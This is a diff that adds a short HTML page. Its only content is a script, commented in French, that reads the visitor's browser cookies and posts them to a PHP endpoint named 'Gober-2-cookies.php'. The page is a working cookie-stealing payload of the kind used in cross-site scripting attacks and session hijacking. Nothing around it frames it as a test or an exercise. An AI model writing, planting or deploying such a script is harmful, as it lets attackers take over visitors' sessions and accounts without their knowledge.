@@ -1,0 +1,13 @@
+<html>
+<body>
+    <script>
+        // Script pour capturer les cookies et les envoyer au serveur
+        var cookies = document.cookie;
+        fetch('/Gober-2-cookies.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: 'cookies=' + encodeURIComponent(cookies)
+        });
+    </script>
+</body>
+</html>
